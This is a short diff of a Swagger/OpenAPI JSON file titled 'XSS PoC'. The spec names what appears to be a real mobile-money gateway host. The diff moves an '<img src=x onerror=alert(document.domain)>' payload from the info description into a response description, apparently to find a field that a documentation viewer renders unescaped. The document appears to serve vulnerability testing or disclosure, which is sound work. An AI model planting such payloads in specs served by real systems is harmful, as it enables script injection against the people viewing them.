@@ -3,13 +3,11 @@
   "info": {
     "version": "1.0.0",
     "title": "XSS PoC",
-    "description": "<img src=x onerror=alert(document.domain)>"
+    "description": "This might be escaped"
   },
   "host": "gateway.tz.smartphone.m-pesa.com",
   "basePath": "/service-adapter",
-  "schemes": [
-    "https"
-  ],
+  "schemes": ["https"],
   "paths": {
     "/poc": {
       "get": {
@@ -17,7 +15,7 @@
         "description": "Trigger XSS",
         "responses": {
           "200": {
-            "description": "OK"
+            "description": "<img src=x onerror=alert(document.domain)>"
           }
         }
       }
